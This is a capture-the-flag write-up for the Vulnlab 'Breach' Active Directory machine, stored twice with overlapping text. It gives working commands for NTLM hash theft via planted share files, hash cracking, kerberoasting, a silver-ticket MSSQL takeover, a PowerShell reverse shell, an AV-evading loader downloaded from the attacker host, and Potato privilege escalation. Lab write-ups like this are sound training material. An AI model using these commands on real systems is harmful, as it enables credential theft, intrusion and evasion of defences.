the possibility of any obscene abnormalities. The `Users` share did not seem to have anything within it aside from the default user folder, so I moved on to see if there was anything within `share`.\n\nThere are three folders within this specific SMB share, being `finance`, `software`, and `transfer`. While we don't have access to two of them, it seems that there are a few users within `transfer`.\n\n```\nsmb: \\transfer\\> ls\n  .                                   D        0  Thu Feb 17 09:00:35 2022\n  ..                                  D        0  Thu Feb 17 09:11:08 2022\n  claire.pope                         D        0  Thu Feb 17 06:21:35 2022\n  diana.pope                          D        0  Thu Feb 17 06:21:19 2022\n  julia.wong                          D        0  Thu Feb 17 06:24:39 2022\n\n7863807 blocks of size 4096. 2618937 blocks available\n```\n\nWe don't have access to any of these users, though we do know now that these are potentially users that we'll need to compromise.\n\nI ran a few tests through Kerberos with these users, however it doesn't seem like they have `no-preauth` set or any of them are kerberoastable. There wasn't much outside of this, as the other directories in this share didn't seem to have much.\n\nGiven what we know (or lack thereof) at this point, I tried to get a nudge from the [Wiki](https://wiki.vulnlab.com/guidance/medium/breach) to see if there were any leads. It seems that the site says `- Assume that someone is visiting the share regulary.`, which points us back at SMB.\n\n# NTLM Theft for Credential Stealing\n\nIf you'll notice, it seems that we have write access to the share.\n\n```\nsmb: \\> ls\n  .                                   D        0  Thu Feb 17 09:11:08 2022\n  ..                                DHS        0  Thu Feb 17 10:38:00 2022\n  finance                             D        0  Thu Feb 17 06:19:34 2022\n  software                            D        0  Thu Feb 17 06:19:12 2022\n  transfer                            D        0  Tue Jun 11 00:58:38 2024\n\n7863807 blocks of size 4096. 2597887 blocks available\nsmb: \\> put ul.txt\nputting file ul.txt as \\ul.txt (0.2 kb/s) (average 0.2 kb/s)\n```\n\nGiven that we have write access and we know that there are individuals that are visiting the share, our foothold seems to be phishing (or at least emulating phishing). We'll more than likely need to place either a reverse shell or some kind of hash theft file within this share. Just a small assumption I made based on the difficulty of the machine - us uploading a reverse shell probably isn't what we're supposed to do here.\n\nSo our next tactic we'll utilize will have to be aimed more at credential theft. This is where I learned about a new tactic that we could try - [NTLM Theft](https://github.com/Greenwolf/ntlm_theft).\n\nWe can use the above tool to generate files that are used for stealing NTLM hashes. If a user is accessing and opening these files, we can point these same files back to a server we stand up to steal said credentials. We can use tools like [Responder](https://www.kali.org/tools/responder/) or Impacket's SMB server to steal these credentials, I'll use responder for this though you could use the ladder.\n\nAfter downloading the tool from the repository, we can use it with the below command.\n\n```\n└─$ python3 ntlm_theft.py -s (KALI IP) -f daz -g all\nCreated: daz/daz.scf (BROWSE TO FOLDER)\nCreated: daz/daz-(url).url (BROWSE TO FOLDER)\nCreated: daz/daz-(icon).url (BROWSE TO FOLDER)\n......\nGeneration Complete.\n```\n\nNow that we have all of these files, we'll need to start up Responder and then place of these files within the share. You can start up responder with `sudo responder -I (VPN INTERFACE NAME).`\n\nI also created a short one-liner that will upload these files to the share, as seen below.\n\n```\n└─$ for file in $(ls .); do smbclient -c \"cd transfer; put $file\" \\\\\\\\10.10.100.72\\\\share -N; done\n```\n\nThis should upload all of the files to the directory, I adjusted us to upload them within the `transfer` directory as I found immediate luck within that specific folder in the share.\n\n```\n[SMB] NTLMv2-SSP Client   : 10.10.100.72\n[SMB] NTLMv2-SSP Username : BREACH\\Julia.Wong\n[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:7a6c9594b3106927:59112474C75D713D82011FAC045A066C:010100000000000000F9EE819EBBDA015CDC76BFA3AFC7C3[...snip...]000009001E0063006900660073002F00310030002E0038002E0030002E003100370033000000000000000000\n```\n\nAs you can see, we received the NTLMv2 hash for the user `julia.wong`. Now that we have their hash, we can try to crack it using hashcat.\n\nThe hash identifier for NetNTLMv2 hashes is 5600. You can find this within the hashcat [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page.\n\n```\n└─$ hashcat -a 0 -m 5600 julia_wong.txt /usr/share/wordlists/rockyou.txt\n\n0f27aeed2fce6717ed091b98a2417efc8960a080416ea342bfd343d4b9ae2f6830a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0030002e003100370033000000000000000000:[...snip...]\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 5600 (NetNTLMv2)\n```\n\nThis should give you the plaintext password for `julia.wong`, meaning we can now utilize their credentials to perform a variety of different actions within this machine. If you log back in to SMB using these credentials, you'll find the first flag for the machine located within `julia.wong`'s directory.\n\n# Dumping LDAP\n\nI verified with crackmapexec, it seems that we do not have WinRM access meaning we'll need to pivot to another service/user. We can first attempt to enumerate LDAP, as we'll be able to see if there are any other users we can pivot to.\n\n```\n└─$ crackmapexec ldap 10.10.100.72 -u 'julia.wong' -p '(JULIA.WONG PASSWORD)'\nSMB         10.10.100.72    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.100.72    389    BREACHDC         [+] breach.vl\\julia.wong:[...snip...]\n```\n\nLet's utilize the [Python ingestor](https://github.com/dirkjanm/BloodHound.py) for [Bloodhound](https://www.kali.org/tools/bloodhound/) to dump the domain, as we can try to enumerate what our current user can do along with getting a user list of all the user objects within the domain.\n\n```\n└─$ bloodhound-python -d 'breach.vl' -u 'julia.wong' -p 'Computer1' -c all -ns 10.10.124.111 --zip\n```\n\nOur `julia.wong` user node does not seem to have anything at first glance, though we can keep looking around for other user objects that may have other privileges.\n\nThere are a few things that I like to do at this point - notably creating a user list of all the domain users (if one wasn't acquired previously) and then using that to either kerberoast/ASREProast. Since we have all of the domain objects in Bloodhound you could just write them into a text file, I also provided a one-liner that does an LDAP query and greps for all of the usernames.\n\n```\n└─$ ldapsearch -x -LLL -H ldap://breachdc.breach.vl -D 'julia.wong@breach.vl' -b 'DC=breach,DC=vl' -w '(JULIA.WONG PASSWORD)' | grep userPrincipalName | awk '{print $2}' | cut -d '@' -f 1 > ul.txt\n```\n\nThis should return a user list for all of the domain user objects that are within the AD environment. Let's now use `GetUserSPNs` to test if any users are kerberoastable. Since we have access to LDAP, what the tool we're about to use is doing is essentially fetching a password hash for user accounts linked to a Service Principal Name (SPN). If any users are able to have this password fetch, it will return an Kerberos TGS that is encrypted with the users password.\n\n```\n└─$ impacket-GetUserSPNs breach.vl/'julia.wong':'(JULIA.WONG PASSWORD)' -dc-ip 10.10.124.111 -request -usersfile ul.txt\n......\n$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$da7e190c[...snip...]d20a2b\n```\n\nAs you can see from the above, a valid TGS was retrieved for the user `svc_mssql`. We can attempt to crack this with `hashcat`. You can find a list of hash modes [here](https://hashcat.net/wiki/doku.php?id=example_hashes) at the hashcat wiki. The specific hash type we have is TGS-REP Kerberos 5 e-Type 23, which is denoted as hash mode ID 13100.\n\n```\nedad60ef4608feef54bb95ed7683b4169c4f356cc7417a869bd6a9cfca8094e081c733f9940f9a8fd3341a31d25f32cda8c70a8115e3389ef562549914dae6a78b2e036378b4dcbd20a2b:[...snip...]\n\nSession..........: hashcat\nStatus...........: Cracked\n```\n\nFrom the above, we can that the password for `svc_mssql` was cracked successfully and you should have the plaintext password for the user.\n\n# Silver Ticket for MSSQL Takeover\n\nIf you take a look back at Bloodhound, this user node's SPN seems to belong to `MSSQLSvc/breachdc.breach.vl:1433`.\n\n![](/images/vulnlab/breach-vl/c.png)\n\nThis corresponds with the MSSQL service that is currently present on the domain controller. Given that we currently have credentials for this user, we could simply attempt to log in via their credentials and see what we can enumerate.\n\n```\n└─$ impacket-mssqlclient breach.vl/'svc_mssql@breach.vl':'(SVC_MSSQL PASSWORD)' -target-ip 10.10.105.115 -windows-auth\n\nSQL (BREACH\\svc_mssql  guest@master)>\n```\n\nIf you'll notice we are logged in as `svc_mssql`, however we're currently logged as the context of the Guest user. This means we won't be able to execute commands via `xp_cmdshell` which is one of the valid ways to execute commands through MSSQL. We could enumerate the local machine with `xp_dirtree` and use MSSQL queries to query to database, however you would not find much to my knowledge.\n\nThere's an interesting exploit that I learned through my progression in AD pen-testing and it involves precisely what we have now - a service account to MSSQL as well as that account have an SPN set for MSSQL. We could perform what's called a Silver Ticket attack, which is essentially impersonating the Administrator account to authenticate to MSSQL via a forged TGS. \n\nIf all goes well, we should be able to pass the silver ticket through to MSSQL and authenticate in the context of the Administrator user. Although we will still be executing commands through `xp_cmdshell` or `xp_dirtree` as `svc_mssql`, the MSSQL client will assume that we are logged in as the Administrator.\n\nYou can find the articles that I used for research into this [here](https://blog.netwrix.com/2022/08/31/impersonating-service-accounts-with-silver-tickets/) and [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket).\n\nSo there are a few things that we'll need to perform this, notably:\n\n* The NTLM hash of the `svc_mssql` account.\n* The domain SID of the `svc_mssql` account.\n* The SPN of the service we are requesting to.\n* The name of the user we want to impersonate.\n\nThis information is all easily accessible to us, excluding the NTLM hash of the service account. We do however already know their plaintext password, so we could just convert the plaintext to an NTLM hash. You can do so online, though I used [this one](https://codebeautify.org/ntlm-hash-generator) particularly.\n\nThe domain SID is also in Bloodhound within the `svc_mssql` user node, which is `S-1-5-21-2330692793-3312915120-706255856`.\n\nSPNs are essentially just the service and the machine DNS name put together, meaning the SPN we are requesting for is `mssql/breachdc.breach.vl`. As for the username, we're trying to impersonate the `Administrator`.\n\nWe can use `impacket-ticketer` with all the information above to request a ticket for the specified SPN. With all the info taken into account, you should receive a command similar to the below.\n\n```\n└─$ impacket-ticketer -nthash 69596C7[...snip...]870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -dc-ip 10.10.105.115 -spn mssql/breachdc.breach.vl -domain breach.vl Administrator\n......\n[*] Saving ticket in Administrator.ccache\n```\n\nAs you can see, the ticket was saved as `Administrator.ccache`. We'll now set this as our Kerberos authentication global variable and attempt to authenticate to MSSQL as the Administrator user.\n\n```\n└─$ export KRB5CCNAME=Administrator.ccache\n\n└─$ impacket-mssqlclient -k breachdc.breach.vl -target-ip 10.10.105.115\nSQL (BREACH\\Administrator  dbo@master)>\n```\n\nIt looks like we were successfully logged within the context of Administrator, let's see if we can enable command execution.\n\n```\nSQL (BREACH\\Administrator  dbo@master)> enable_xp_cmdshell\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\nSQL (BREACH\\Administrator  dbo@master)> xp_cmdshell whoami\noutput             \n----------------   \nbreach\\svc_mssql   \n\nNULL\n```\n\nIt seems as though we can! Now that we are able to do this, let's see if we can execute any arbitrary commands to gain a reverse shell. I opted to use a base64'd powershell reverse shell that you can make via [revshells.com](https://www.revshells.com/).\n\n```\nSQL (BREACH\\Administrator  dbo@master)> xp_cmdshell powershell -e (POWERSHELL BASE64 REV SHELL ENCODED)\noutput                                                                             \n--------------------------------------------------------------------------------   \n#< CLIXML                                                                          \n\n<Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"><S S=\"Error\">At line:1 char:1_x000D__x000A_</S><S S=\"Error\">+ $client = New-Object System.Net.Sockets.TCPClient(\"10.8.0.173\",9001); ..._x000D__x000A_</S><S S=\"Error\">+ ~~~~~~~   \n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S=\"Error\">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S><S S=\"Error\">    + CategoryInfo          : ParserError: (   \n\n:) [], ParentContainsErrorRecordException_x000D__x000A_</S><S S=\"Error\">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_</S><S S=\"Error\"> _x000D__x000A_</S></Objs>\n```\n\nIf you'll notice from the above command output, it seems that AV is enabled on this machine - meaning we can't simply execute malicious files as we normally would.\n\n# Bypassing AV with PE Loaders\n\nSince this is a Windows 2022 Datacenter (which I found later on for Priv Esc), we could simply just upload a Havoc binary since the signatures for [Havoc C2](https://github.com/HavocFramework/Havoc) beacons are not considered malicious in this version of Windows. If you stood up a havoc server, you should be able to upload the demon x64 binary through MSSQL and execute it to get a reverse shell.\n\nI wanted to use a different exploit this time around though that involves using Sliver. There's a really interesting loader that I learned to use recently for AV bypass - one that even works for the most recent version of Windows 11. This specific loader is called [FilelessPELoader](https://github.com/SaadAhla/FilelessPELoader), and it requires a bit of signature detection obfuscation before utilizing it properly. Luckily enough, the author of this loader (seamys, all credit goes to him for the development of this loader) has made a relatively short walkthrough on how to do this that you can find [here](https://youtu.be/NmB2MPAafTo?si=58ITZ4LFxG2DBc2t).\n\nSo if you've followed the loader walkthrough video accordingly, you should have the executable compiled from Visual Studio. I'll spin up a quick [Sliver C2](https://github.com/BishopFox/sliver) server and create an implant as well as start an MTLS listener.\n\n```\nsliver > mtls\n[*] Starting mTLS listener ...\n[*] Successfully started job #1\nsliver > generate --mtls (YOUR IP) --os windows --format exe --arch amd64 --save (DIRECTORY) --name breach\n```\n\nSkipping symbol obfuscation with `--skip-symbols` shouldn't matter here, though if you do run into problems with the loader feel free to set that to a newly generated binary.\n\nNext be sure to load this with the `aes.py` file that is provided in the FilelessPELoader GitHub repo, we can do this easily by running it with `python3 aes.py breach.exe`. This should generated the respective key files needed for the exploit.\n\nNow that all of the legwork is done, you should have four files within your directory - `breach.exe`, `cipher.bin`, `key.bin`, and finally your obfuscated loader that you compiled previously. Make sure to host your directory that contains these four files with a simple Python HTTP server at the port of your choosing. We'll now head back to MSSQL and execute the commands needed to exploit this.\n\n```\nSQL (BREACH\\Administrator  dbo@master)> xp_cmdshell powershell \"cd C:\\; mkdir temp; cd C:\\temp; curl http://(YOUR IP):9001/dazzad.exe -O dazzad.exe; .\\dazzad.exe (YOUR IP) 9001 cipher.bin key.bin\"\n```\n\nThe above one-liner should create a temp directory in `C:\\` and download the loader, before finally executing the key files remotely based on your HTTP server.\n\n![](/images/vulnlab/breach-vl/d.png)\n\nAs you can see after a bit of waiting, a session has been created as `svc_mssql`.\n\n# Exploiting SeImpersonatePrivilege Against SYSTEM\n\nNow that we have code execution as `svc_mssql` on the remote system, we can look around to see if their are any binaries or privileges that we can exploit.\n\nLuckily enough, this should not be very difficult as we already contain a privilege that we exploited previously to impersonate Administrator on the MSSQL service. We can use this same privilege to impersonate SYSTEM on the local machine.\n\nBefore we do this though, I want to detail why this exploit specifically works with a service account that has SeImpersonatePrivilege. Service accounts, by default, will have this privilege along with SeAssignPrimaryTokenPrivilege. Having SeImpersonatePrivilege essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.\n\n![](/images/vulnlab/breach-vl/e.png)\n\nExploiting this is relatively simple, as we can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM.\n\nIn the past and up until now, the easiest way was to utilize the Potato Family of exploits to impersonate and spawn this named pipe. As of today, most of the Potato family has been detected by Defender which renders most of the executables unusable with traditional means.\n\nLuckily enough since we currently have a session through an obfuscated payload that isn't detected by Defender, we can execute these binaries through a .NET assembly that shouldn't allow them to be detected from Defender's behavioral detection. I tested this out with two different exploits in the Potato family, notably [SweetPotato](https://github.com/CCob/SweetPotato) and [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato).\n\nYou'll need to compile both of these executables in Visual Studio on a Windows host before using it with Sliver.\n\n```\n└─$ ls | grep Potato\nSharpEfsPotato.exe\nSweetPotato.exe\n```\n\nNow that we have either one of these executables, we can use Sliver's built-in `execute-assembly` command to execute these binaries through a .NET assembly. This prevents us from needing to drop the binaries locally on the compromised machine.\n\nI've provided the arguments that you'll need in order to execute either one of these exploits. Both will land you a new session as SYSTEM if exploited correctly. Remember to ensure that you still have your simple Python HTTP server running since the arguments passed into either exploit will be executing our loader from before.\n\nThe first that I'll show is using SharpEfsPotato to exploit this.\n\n```\nsliver (breach) > execute-assembly SharpEfsPotato.exe '-p C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"C:\\temp\\dazzad.exe (KALI IP) 9001 cipher.bin key.bin\"'\n\n[*] Output:\nSharpEfsPotato by @bugch3ck\n  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.\n\n  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.\n\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/e5b2e9a2-d802-4d36-aeab-2e0e4482647b/\\e5b2e9a2-d802-4d36-aeab-2e0e4482647b\\e5b2e9a2-d802-4d36-aeab-2e0e4482647b\ndf1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:\n[x]RpcBindingSetAuthInfo failed with status 0x6d3\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n\n[*] Session b4eedc0a breach - 10.10.112.238:63780 (BREACHDC) - windows/amd64 - Sat, 29 Jun 2024 00:20:05 EDT\n```\n\nAnd the next that I'll show is using SweetPotato to exploit the same functionality.\n\n```\nsliver (breach) > execute-assembly SweetPotato.exe '-p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"C:\\temp\\dazzad.exe (KALI IP) 9001 cipher.bin key.bin\" -e EfsRpc'\n\n[*] Output:\nSweetPotato by @_EthicalChaos_\n  Orignal RottenPotato code and exploit by @foxglovesec\n  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n  PrintSpoofer discovery and original exploit by @itm4n\n  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam\n[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/ad72050e-613c-4ae3-a1c0-1c8f6908f715/\\ad72050e-613c-4ae3-a1c0-1c8f6908f715\\ad72050e-613c-4ae3-a1c0-1c8f6908f715\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n\n[*] Session 4123ca51 breach - 10.10.112.238:63856 (BREACHDC) - windows/amd64 - Sat, 29 Jun 2024 00:24:18 EDT\n```\n\nNote that I needed to specify the exploit mode to `EfsRpc` as the other exploit modes should fail due to an unsuccessful authentication interceptions. I've found this to really only work consistently with `EfsRpc`.\n\n![](/images/vulnlab/breach-vl/f.png)\n\nAs seen from the above, both have spawned a session as SYSTEM. This means that we can simply use either session and access the root flag within the Administrator's Desktop directory.\n\n```\nsliver (breach) > use 4123ca51-3f10-4ee7-a5e5-7142245ad26a\n\n[*] Active session breach (4123ca51-3f10-4ee7-a5e5-7142245ad26a)\n\nsliver (breach) > cat \"C:\\Users\\Administrator\\Desktop\\root.txt\"\n\nVL[...snip...]\n```\n\nNow that we have read the root flag, we have successfully compromised this machine!\n\n# Conclusion\n\nI came back to this machine after not initially knowing what I was doing the first time around. I had completed it, but I didn't really learn much from it. After about a few months of practicing red-teaming, I was more confident in what I was doing and put a lot of the resources that I had learned to the test. It seems that it paid off, which I'm satisfied with.\n\nBig thanks to xct for creating this machine, this machine was very fulfilling.\n\n# Resources\n\nhttps://wiki.vulnlab.com/guidance/medium/breach\nhttps://github.com/Greenwolf/ntlm_theft\nhttps://www.kali.org/tools/responder/\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://www.kali.org/tools/bloodhound/\nhttps://blog.netwrix.com/2022/08/31/impersonating-service-accounts-with-silver-tickets/\nhttps://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\nhttps://codebeautify.org/ntlm-hash-generator\nhttps://www.revshells.com/\nhttps://github.com/HavocFramework/Havoc\nhttps://github.com/SaadAhla/FilelessPELoader\nhttps://www.youtube.com/watch?si=58ITZ4LFxG2DBc2t&v=NmB2MPAafTo&feature=youtu.be\nhttps://github.com/BishopFox/sliver\nhttps://github.com/CCob/SweetPotato\nhttps://github.com/bugch3ck/SharpEfsPotato","source":"_posts/breach.md","raw":"---\ntitle: Breach - Vulnlab\ndate: 2024-06-29 00:54:06\ntags: [vulnlab, Medium]\ncategories: vulnlab\nkeywords: 'Vulnlab, Medium, Windows'\ndescription: Breach in particular was one of the first Vulnlab machines I had tried when I started Vulnlab back in December - though I really didn't know what was going on as I had just started off doing red team labs. Since then, I've done essentially every easy machine on the Vulnlab archive and large amount of seasonal machines on HTB. Hopefully I'll be able to relay this a bit easier this time around.\ncover: /images/vulnlab/breach-vl/breach_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nBreach in particular was one of the first Vulnlab machines I had tried when I started Vulnlab back in December - though I really didn't know what was going on as I had just started off doing red team labs. Since then, I've done essentially every easy machine on the Vulnlab archive and large amount of seasonal machines on HTB. Hopefully I'll be able to relay this a bit easier this time around.\n\n# Enumeration\n\nLet's start out with our usual NMAP scans, just the default.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-10 17:08 EDT\nNmap scan report for 10.10.101.89\nHost is up (0.13s latency).\nNot shown: 986 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n1433/tcp open  ms-sql-s\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 21.40 seconds\n```\n\nWe have a few ports to take a look at here, notably the HTTP server, LDAP, and SMB. Another big thing to mention is that MSSQL seems to be externally facing - which is a vulnerability in of itself. This database and this service should be internal.\n\n![](/images/vulnlab/breach-vl/b.png)\n\nThe HTTP server seems to be a default IIS page, with nothing much else on it. It doesn't seem to be associated with a domain, meaning there's a high chance that we don't need to enumerate for any subdomains.\n\nGobuster didn't seem to return any results either in terms of directory brute-forcing. I couldn't find much aside from this in terms of the IIS server, so we'll move to another service.\n\nIn terms of the domain itself, I found the DNS names for the target machine denoted as `BREACHDC.breach.vl` as seen in the RDP results.\n\n```\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2024-06-10T21:17:12+00:00; +4s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: BREACH\n|   NetBIOS_Domain_Name: BREACH\n|   NetBIOS_Computer_Name: BREACHDC\n|   DNS_Domain_Name: breach.vl\n|   DNS_Computer_Name: BREACHDC.breach.vl\n|   DNS_Tree_Name: breach.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-06-10T21:16:33+00:00\n| ssl-cert: Subject: commonName=BREACHDC.breach.vl\n```\n\nWe can fill these in within our `/etc/hosts` file to make sure that the IP address is resolved to both of these domain names.\n\nIn terms of SMB, it seems that we have access to enumerate multiple shares as seen below.\n\n```\n└─$ smbclient -L 10.10.101.89 -N               \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        share           Disk      \n        SYSVOL          Disk      Logon server share \n        Users           Disk      \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.101.89 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nThese specific shares are `share` and `Users`, which we can enumerate for the possibility of any obscene abnormalities. The `Users` share did not seem to have anything within it aside from the default user folder, so I moved on to see if there was anything within `share`.\n\nThere are three folders within this specific SMB share, being `finance`, `software`, and `transfer`. While we don't have access to two of them, it seems that there are a few users within `transfer`.\n\n```\nsmb: \\transfer\\> ls\n  .                                   D        0  Thu Feb 17 09:00:35 2022\n  ..                                  D        0  Thu Feb 17 09:11:08 2022\n  claire.pope                         D        0  Thu Feb 17 06:21:35 2022\n  diana.pope                          D        0  Thu Feb 17 06:21:19 2022\n  julia.wong                          D        0  Thu Feb 17 06:24:39 2022\n\n7863807 blocks of size 4096. 2618937 blocks available\n```\n\nWe don't have access to any of these users, though we do know now that these are potentially users that we'll need to compromise.\n\nI ran a few tests through Kerberos with these users, however it doesn't seem like they have `no-preauth` set or any of them are kerberoastable. There wasn't much outside of this, as the other directories in this share didn't seem to have much.\n\nGiven what we know (or lack thereof) at this point, I tried to get a nudge from the [Wiki](https://wiki.vulnlab.com/guidance/medium/breach) to see if there were any leads. It seems that the site says `- Assume that someone is visiting the share regulary.`, which points us back at SMB.\n\n# NTLM Theft for Credential Stealing\n\nIf you'll notice, it seems that we have write access to the share.\n\n```\nsmb: \\> ls\n  .                                   D        0  Thu Feb 17 09:11:08 2022\n  ..                                DHS        0  Thu Feb 17 10:38:00 2022\n  finance                             D        0  Thu Feb 17 06:19:34 2022\n  software                            D        0  Thu Feb 17 06:19:12 2022\n  transfer                            D        0  Tue Jun 11 00:58:38 2024\n\n7863807 blocks of size 4096. 2597887 blocks available\nsmb: \\> put ul.txt\nputting file ul.txt as \\ul.txt (0.2 kb/s) (average 0.2 kb/s)\n```\n\nGiven that we have write access and we know that there are individuals that are visiting the share, our foothold seems to be phishing (or at least emulating phishing). We'll more than likely need to place either a reverse shell or some kind of hash theft file within this share. Just a small assumption I made based on the difficulty of the machine - us uploading a reverse shell probably isn't what we're supposed to do here.\n\nSo our next tactic we'll utilize will have to be aimed more at credential theft. This is where I learned about a new tactic that we could try - [NTLM Theft](https://github.com/Greenwolf/ntlm_theft).\n\nWe can use the above tool to generate files that are used for stealing NTLM hashes. If a user is accessing and opening these files, we can point these same files back to a server we stand up to steal said credentials. We can use tools like [Responder](https://www.kali.org/tools/responder/) or Impacket's SMB server to steal these credentials, I'll use responder for this though you could use the ladder.\n\nAfter downloading the tool from the repository, we can use it with the below command.\n\n```\n└─$ python3 ntlm_theft.py -s (KALI IP) -f daz -g all\nCreated: daz/daz.scf (BROWSE TO FOLDER)\nCreated: daz/daz-(url).url (BROWSE TO FOLDER)\nCreated: daz/daz-(icon).url (BROWSE TO FOLDER)\n......\nGeneration Complete.\n```\n\nNow that we have all of these files, we'll need to start up Responder and then place of these files within the share. You can start up responder with `sudo responder -I (VPN INTERFACE NAME).`\n\nI also created a short one-liner that will upload these files to the share, as seen below.\n\n```\n└─$ for file in $(ls .); do smbclient -c \"cd transfer; put $file\" \\\\\\\\10.10.100.72\\\\share -N; done\n```\n\nThis should upload all of the files to the directory, I adjusted us to upload them within the `transfer` directory as I found immediate luck within that specific folder in the share.\n\n```\n[SMB] NTLMv2-SSP Client   : 10.10.100.72\n[SMB] NTLMv2-SSP Username : BREACH\\Julia.Wong\n[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:7a6c9594b3106927:59112474C75D713D82011FAC045A066C:010100000000000000F9EE819EBBDA015CDC76BFA3AFC7C3[...snip...]000009001E0063006900660073002F00310030002E0038002E0030002E003100370033000000000000000000\n```\n\nAs you can see, we received the NTLMv2 hash for the user `julia.wong`. Now that we have their hash, we can try to crack it using hashcat.\n\nThe hash identifier for NetNTLMv2 hashes is 5600. You can find this within the hashcat [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page.\n\n```\n└─$ hashcat -a 0 -m 5600 julia_wong.txt /usr/share/wordlists/rockyou.txt\n\n0f27aeed2fce6717ed091b98a2417efc8960a080416ea342bfd343d4b9ae2f6830a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0030002e003100370033000000000000000000:[...snip...]\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 5600 (NetNTLMv2)\n```\n\nThis should give you the plaintext password for `julia.wong`, meaning we can now utilize their credentials to perform a variety of different actions within this machine. If you log back in to SMB using these credentials, you'll find the first flag for the machine located within `julia.wong`'s directory.\n\n# Dumping LDAP\n\nI verified with crackmapexec, it seems that we do not have WinRM access meaning we'll need to pivot to another service/user. We can first attempt to enumerate LDAP, as we'll be able to see if there are any other users we can pivot to.\n\n```\n└─$ crackmapexec ldap 10.10.100.72 -u 'julia.wong' -p '(JULIA.WONG PASSWORD)'\nSMB         10.10.100.72    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.100.72    389    BREACHDC         [+] breach.vl\\julia.wong:[...snip...]\n```\n\nLet's utilize the [Python ingestor](https://github.com/dirkjanm/BloodHound.py) for [Bloodhound](https://www.kali.org/tools/bloodhound/) to dump the domain, as we can try to enumerate what our current user can do along with getting a user list of all the user objects within the domain.\n\n```\n└─$ bloodhound-python -d 'breach.vl' -u 'julia.wong' -p 'Computer1' -c all -ns 10.10.124.111 --zip\n```\n\nOur `julia.wong` user node does not seem to have anything at first glance, though we can keep looking around for other user objects that may have other privileges.\n\nThere are a few things that I like to do at this point - notably creating a user list of all the domain users (if one wasn't acquired previously) and then using that to either kerberoast/ASREProast. Since we have all of the domain objects in Bloodhound you could just write them into a text file, I also provided a one-liner that does an LDAP query and greps for all of the usernames.\n\n```\n└─$ ldapsearch -x -LLL -H ldap://breachdc.breach.vl -D 'julia.wong@breach.vl' -b 'DC=breach,DC=vl' -w '(JULIA.WONG PASSWORD)' | grep userPrincipalName | awk '{print $2}' | cut -d '@' -f 1 > ul.txt\n```\n\nThis should return a user list for all of the domain user objects that are within the AD environment. Let's now use `GetUserSPNs` to test if any users are kerberoastable. Since we have access to LDAP, what the tool we're about to use is doing is essentially fetching a password hash for user accounts linked to a Service Principal Name (SPN). If any users are able to have this password 